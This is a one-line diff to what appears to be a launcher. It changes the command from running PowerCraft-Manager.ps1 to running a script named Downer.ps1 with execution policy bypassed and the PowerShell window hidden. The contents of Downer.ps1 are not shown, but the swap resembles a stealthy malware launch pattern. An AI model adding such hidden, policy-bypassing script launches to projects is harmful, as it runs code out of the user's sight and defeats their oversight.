@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -File .\PowerCraft-Manager.ps1
+powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -WindowStyle Hidden -File .\Downer.ps1
